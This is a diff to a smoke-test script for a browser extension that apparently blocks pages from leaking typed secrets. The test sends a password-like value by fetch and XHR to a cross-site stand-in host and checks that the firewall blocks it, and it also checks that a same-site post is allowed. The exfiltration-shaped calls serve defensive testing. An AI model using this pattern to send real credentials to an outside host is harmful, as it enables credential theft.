@@ -29,20 +29,35 @@
     // Give the extension's debounce time to fingerprint the value.
     await new Promise((r) => setTimeout(r, 800));
 
-    // Real fetch() carrying the value to a generic, non-resolving
-    // documentation-reserved domain (RFC 2606 .example) - not victim/attacker
-    // themed, just a generic "some third party" destination.
+    // Malicious-shaped fetch(): a cross-site destination carrying the
+    // fingerprinted value. Expected: the firewall BLOCKS this before it
+    // leaves the page (rejected with err.unmaskBlocked === true).
     try {
       await fetch('https://telemetry-collector.example/ingest', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ user: 'smoke-test', password: SECRET_VALUE })
       });
+      log('cross-site fetch: NOT blocked (unexpected)');
     } catch (e) {
-      log('fetch network error (expected, .example does not resolve): ' + e.message);
+      log('cross-site fetch: ' + (e.unmaskBlocked ? 'BLOCKED by UNMASK (expected)' : 'network error - ' + e.message));
     }
 
-    // Real XHR carrying the value too, to exercise the XHR vector.
+    // Legitimate-shaped fetch(): same-site destination carrying the same
+    // value (e.g. the real login submission). Expected: ALLOWED through.
+    try {
+      await fetch('/same-site-endpoint', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ user: 'smoke-test', password: SECRET_VALUE })
+      });
+      log('same-site fetch: allowed through (expected)');
+    } catch (e) {
+      log('same-site fetch: ' + (e.unmaskBlocked ? 'BLOCKED by UNMASK (unexpected!)' : 'network error - ' + e.message));
+    }
+
+    // Real XHR to the cross-site destination too, to confirm the
+    // (unmodified, observe-only for now) XHR vector still behaves as before.
     await new Promise((resolve) => {
       const xhr = new XMLHttpRequest();
       xhr.open('POST', 'https://telemetry-collector.example/xhr-ingest');
@@ -52,7 +67,7 @@
       xhr.send('user=smoke-test&password=' + encodeURIComponent(SECRET_VALUE));
     });
 
-    log('done - check backend /incidents for a matching event');
+    log('done - check backend /incidents for BLOCKED and OBSERVED events');
   }
 
   run();
